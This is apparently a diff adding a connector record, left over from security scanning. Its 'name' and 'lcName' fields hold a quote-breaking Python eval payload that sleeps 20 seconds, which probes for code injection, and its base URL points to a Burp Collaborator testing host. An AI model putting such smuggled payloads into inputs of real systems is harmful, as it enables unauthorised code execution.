@@ -1,0 +1,17 @@
+{
+	"baseUrl":"http://burpcollaborator.net/zgjZCdeP",
+	"createdTime":1741334763304,
+	"deleted":false,
+	"description":"qvaqcL",
+	"enabled":false,
+	"id":"67caa8ebb8a3852f709fe391",
+	"lastModifiedBy":22743,
+	"lcName":"hsudcq'+eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))+'",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741334763304,
+	"name":"hsuDcq'+eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))+'",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
